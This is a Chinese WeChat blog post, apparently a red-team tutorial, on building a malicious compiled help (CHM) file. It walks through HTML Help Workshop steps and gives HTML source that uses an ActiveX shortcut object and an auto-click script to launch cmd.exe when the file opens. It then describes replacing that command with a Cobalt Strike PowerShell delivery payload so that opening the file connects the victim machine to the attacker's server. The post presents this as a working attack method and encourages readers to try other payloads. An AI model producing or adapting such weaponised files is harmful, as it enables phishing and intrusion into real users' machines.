#  黑客(红队)攻防中内网利用chm文件进行getshell上线

原创 Flowers aq [ flower安全混子 ](javascript:void\(0\);)

**flower安全混子** ![]()

微信号 flowerx258

功能介绍 一定要离梦想近一点.

____

___发表于_

收录于合集

#红蓝对抗 5 个

#安全日志 24 个

#红队 4 个

**前言：**

  今天这个文章的来源是前几天和一位师傅的交流

![]()

![]()

 **chm：  
**

 **  **直接说 **chm** 文件师傅们可能比较懵但是看一下chm文件的图标可能就记起来了  

![]()

chm全称Compiled Help Manual利用HTML作源码是微软新一代帮助文件格式。

 **HTML编译：  
**

  要将HTML编译为chm需要借助HTML Help Workshop工具 **：  
**

  * 

    
    
     https://softpedia-secure-download.com/dl/18835165e5cb1c12b57394383d4aeccb/64cfb352/100068169/software/authoring/htmlhelp.exe

下载完成之后先新建一个.hhp后缀的文件：  

![]()

再新建一个HTML文件：  

![]()

  *   *   *   *   *   *   *   *   * 

    
    
     <!DOCTYPE html><html><head><title>Mousejack replay</title>        <head></head>        <body>hellp word<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>            <PARAM name="Command" value="ShortCut">                 <PARAM name="Button" value="Bitmap::shortcut">                     <PARAM name="Item1" value=',cmd.exe'>                         <PARAM name="Item2" value="273,1,1">                        </OBJECT><SCRIPT>x.Click();</SCRIPT>        </body></html>

![]()

然后打开hhw工具：

![]()

点击File-->New：

![]()

再点击Project：

![]()

![]()

选择刚刚创建的test.hhp文件：

![]()

![]()

再点击HTML files：  

![]()

再点击Add：

![]()

![]()

添加刚刚的test.html文件，最后点击完成：

![]()

查看源码有没有错误，查看完后点击File-->Compile：

![]()

![]()

点击Compile：

![]()

出现了生成日志按照日志位置找到test.chm文件：

![]()

双击运行：

![]()

成功弹出cmd

 **利用chm进行CS上线：**

  首先启动Kali上部署CS：  

![]()

本地连接：

![]()

![]()

点击攻击Attacks-->Web Druve-by-->Scripted Web Delivert生成一个powershell上线命令

![]()

然后更改刚刚HTML源码中的Value值

![]()

但是CS生成的payload中要在powershell.exe后加个逗号

![]()

![]()

准备好所需的文件

![]()

  

![]()

编译生成red.chm

![]()

拿到测试环境，直接命令行启动：

![]()

![]()

成功上线

总结：

chm上线的操作大多在win11以下设备上成功率较高，且操作没有以往的难度大，所以本文字数也较少，师傅们也可自行思考利用其它payload达到出其不意的效果。  
  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

